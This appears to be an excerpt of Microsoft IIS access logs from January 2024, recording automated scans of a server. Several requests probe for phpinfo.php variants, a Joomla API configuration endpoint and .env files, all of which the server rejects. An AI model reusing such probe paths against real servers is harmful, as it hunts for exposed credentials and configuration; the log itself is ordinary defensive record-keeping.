+2024-01-24 21:08:46 172.31.36.65 GET /html/phpinfo.php - 443 - 63.135.161.110 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:08:46 172.31.36.65 GET / phpinfo=-1 443 - 63.135.161.122 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 200 0 0 15
+2024-01-24 21:08:46 172.31.36.65 GET /__info.php - 443 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:48 172.31.36.65 GET /_info-backoffice.php - 443 - 173.239.211.35 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:08:48 172.31.36.65 GET /_info.php - 443 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:48 172.31.36.65 GET /_phpinf.php - 443 - 45.130.83.240 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:48 172.31.36.65 GET /_phpinfo.php - 443 - 63.135.161.121 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 48
+2024-01-24 21:08:50 172.31.36.65 GET /_poopinfo.php - 443 - 173.239.211.54 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 62
+2024-01-24 21:08:50 172.31.36.65 GET /.__info.php - 443 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 55
+2024-01-24 21:08:50 172.31.36.65 GET /.info.php - 443 - 45.130.83.246 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 55
+2024-01-24 21:08:51 172.31.36.65 GET /0.0_phpinfo.php - 443 - 45.130.83.248 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:08:51 172.31.36.65 GET /00_server_info.php - 443 - 45.130.83.244 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:51 172.31.36.65 GET /02-info.php - 443 - 45.130.83.243 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:53 172.31.36.65 GET /1_1_PhpInfo.php - 443 - 45.130.83.240 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:08:53 172.31.36.65 GET /5info.php - 443 - 173.239.211.55 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 55
+2024-01-24 21:08:54 172.31.36.65 GET / - 443 - 45.130.83.243 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 15
+2024-01-24 21:09:10 172.31.36.65 GET /api/index.php/v1/config/application public=true 443 - 173.239.211.48 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 63
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 22:09:14
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 22:09:11 172.31.36.65 HEAD /Core/Skin/Login.aspx - 80 - 43.129.169.161 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 1300
+2024-01-24 22:12:15 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 107
+2024-01-24 22:12:15 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 105
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 22:40:24
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 22:40:21 172.31.36.65 GET / - 80 - 146.19.24.23 - - 200 0 0 1212
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 23:07:22
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 23:07:19 172.31.36.65 GET /.env - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1199
+2024-01-24 23:07:19 172.31.36.65 POST / - 443 - 141.95.74.78 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 104
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2024-01-24 23:57:26
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2024-01-24 23:57:23 172.31.36.65 GET /.env - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 404 0 2 1411
+2024-01-24 23:57:23 172.31.36.65 POST / - 80 - 135.125.217.54 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.129+Safari/537.36 - 405 0 1 105
